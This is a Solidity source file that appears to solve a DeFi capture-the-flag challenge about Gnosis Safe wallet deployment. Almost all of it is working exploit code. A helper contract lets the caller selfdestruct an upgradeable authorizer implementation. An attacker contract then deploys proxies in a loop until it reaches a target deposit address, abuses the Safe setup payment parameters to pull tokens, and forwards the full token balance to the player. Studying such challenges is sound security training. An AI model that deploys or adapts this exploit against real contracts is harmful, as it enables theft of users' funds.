// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "./WalletDeployer.sol";
import "./AuthorizerUpgradeable.sol";

contract BadAuthorizerUpgradeable is AuthorizerUpgradeable {
    function die(address player) public {
        selfdestruct(payable(player));
    }
}

contract WalletMiningAttacker {

    GnosisSafe public constant MASTER_COPY = GnosisSafe(payable(0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F));
    GnosisSafeProxyFactory public constant WALLET_FACTORY = GnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    address public constant DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;
    uint256 public constant MAGIC_NUMBER = 42;

    address public immutable player;
    WalletDeployer public immutable walletDeployer;
    IERC20 public immutable token;


    constructor(address _walletDeployer) {
        player = msg.sender;
        walletDeployer = WalletDeployer(_walletDeployer);
        token = IERC20(walletDeployer.gem());
    }

    function attack() public {
        bytes memory callData;
        bytes memory callDataPayment;
        address[] memory owners = new address[](1);
        GnosisSafe wallet;
        owners[0] = address(this);
        callData = abi.encodeCall(GnosisSafe.setup, (
                owners, // _owners
                1, // _threshold
                address(0), // to
                "", // data
                address(0), // fallbackHandler
                address(token), // paymentToken
                0, // payment
                payable(address(this)) // paymentReceiver
            ));

        for (uint i=1; i<=MAGIC_NUMBER; i++) {
            WALLET_FACTORY.createProxy(address(MASTER_COPY), callData);
        }
        
        callDataPayment = abi.encodeCall(GnosisSafe.setup, (
                owners, // _owners
                1, // _threshold
                address(0), // to
                "", // data
                address(0), // fallbackHandler
                address(token), // paymentToken
                20000000 ether, // payment
                payable(address(this)) // paymentReceiver
            ));
        wallet = GnosisSafe(payable(walletDeployer.drop(callDataPayment)));

        for (uint i = 0; i < MAGIC_NUMBER; i++) {
            wallet = GnosisSafe(payable(walletDeployer.drop(callData)));
        }

        token.transfer(player, token.balanceOf(address(this)));
    }


}